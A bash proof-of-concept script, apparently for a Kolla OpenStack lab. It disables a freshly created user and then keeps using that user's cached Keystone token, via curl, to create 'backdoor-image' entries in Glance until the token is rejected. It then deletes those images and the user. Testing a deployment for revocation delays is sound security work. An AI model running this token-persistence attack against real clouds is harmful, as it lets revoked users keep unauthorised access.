#!/bin/bash

echo "=== 5-MINUTE PERSISTENCE ATTACK ==="
echo "Exploiting token cache delay after user disable"
echo ""

source /etc/kolla/admin-openrc.sh

echo "[1] Creating attacker with MEMBER role..."
openstack user create --password attack123 persistence-attacker --domain default
openstack role add --user persistence-attacker --project admin member
echo "Attacker created (member role on admin project)"
echo ""

echo "[2] Attacker authenticates..."
export OS_USERNAME=persistence-attacker
export OS_PASSWORD=attack123
export OS_PROJECT_NAME=admin
ATTACK_TOKEN=$(openstack token issue -f value -c id)
echo "Token: ${ATTACK_TOKEN:0:30}..."
echo "Token obtained at: $(date '+%T')"
echo ""

echo "[3] Admin detects attack and disables user..."
source /etc/kolla/admin-openrc.sh
openstack user set --disable persistence-attacker
DISABLE_TIME=$(date '+%s')
echo "User disabled at: $(date '+%T')"
echo ""

echo "[4] Attacker continues for 5 minutes using cached token..."
echo "Target: Upload malicious images to Glance"
echo ""

IMAGES_UPLOADED=0
ATTEMPTS=0

# Create a small test image file
dd if=/dev/zero of=/tmp/malicious.img bs=1M count=1 2>/dev/null

# Attack for up to 5.5 minutes
while [ $(( $(date '+%s') - DISABLE_TIME )) -lt 330 ]; do
    ELAPSED=$(( $(date '+%s') - DISABLE_TIME ))
    ATTEMPTS=$((ATTEMPTS + 1))

    echo ""
    echo "[Attempt $ATTEMPTS - ${ELAPSED}s after disable]"
    echo "  Testing Glance access..."

    # Try to list images first
    LIST_CODE=$(curl -s -o /dev/null -w "%{http_code}" \
        -H "X-Auth-Token: $ATTACK_TOKEN" \
        http://192.168.100.11:9292/v2/images)

    echo "  Glance API response: $LIST_CODE"

    if [ "$LIST_CODE" = "200" ]; then
        echo "  SUCCESS - API still accessible!"

        # Try to upload malicious image
        IMAGE_NAME="backdoor-image-${ATTEMPTS}-${ELAPSED}s"

        UPLOAD_RESULT=$(curl -s -w "\nHTTP:%{http_code}" \
            -H "X-Auth-Token: $ATTACK_TOKEN" \
            -H "Content-Type: application/json" \
            -X POST http://192.168.100.11:9292/v2/images \
            -d "{
                \"name\": \"$IMAGE_NAME\",
                \"disk_format\": \"raw\",
                \"container_format\": \"bare\",
                \"visibility\": \"private\"
            }" 2>&1)

        UPLOAD_CODE=$(echo "$UPLOAD_RESULT" | grep "HTTP:" | cut -d: -f2)

        if [ "$UPLOAD_CODE" = "201" ]; then
            echo "  Malicious image created: $IMAGE_NAME"
            IMAGES_UPLOADED=$((IMAGES_UPLOADED + 1))
        fi

        sleep 45  # Wait 45 seconds between attempts

    elif [ "$LIST_CODE" = "401" ]; then
        echo "  Token finally invalidated"
        break
    else
        echo "  Unexpected response: $LIST_CODE"
        sleep 30
    fi
done

ATTACK_DURATION=$(( $(date '+%s') - DISABLE_TIME ))

rm -f /tmp/malicious.img

echo ""
echo "========================================="
echo "         ATTACK RESULTS"
echo "========================================="
echo ""
echo "User disabled at: $(date -d @$DISABLE_TIME '+%T')"
echo "Attack duration: ${ATTACK_DURATION} seconds ($(($ATTACK_DURATION / 60)) minutes)"
echo "Attack attempts: $ATTEMPTS"
echo "Images uploaded: $IMAGES_UPLOADED"
echo ""

if [ $IMAGES_UPLOADED -gt 0 ]; then
    echo "VULNERABILITY CONFIRMED"
    echo ""
    echo "After user was disabled, attacker uploaded $IMAGES_UPLOADED"
    echo "images during the ${ATTACK_DURATION}-second window."
    echo ""

    source /etc/kolla/admin-openrc.sh
    echo "--- Malicious images created ---"
    openstack image list | grep backdoor-image | head -10

    echo ""
    echo "Impact:"
    echo "  - Storage consumption (DoS)"
    echo "  - Malicious images in system"
    echo "  - Data exfiltration via images"
    echo "  - ${ATTACK_DURATION}s window for abuse"
fi

echo ""
echo "=== CLEANUP ==="
source /etc/kolla/admin-openrc.sh
echo "Deleting malicious images..."
openstack image list -f value -c ID | while read ID; do
    NAME=$(openstack image show $ID -f value -c name 2>/dev/null)
    if echo "$NAME" | grep -q "backdoor-image"; then
        echo "  Deleting: $NAME"
        openstack image delete $ID 2>/dev/null
    fi
done
openstack user delete persistence-attacker 2>/dev/null
echo "Cleanup complete"
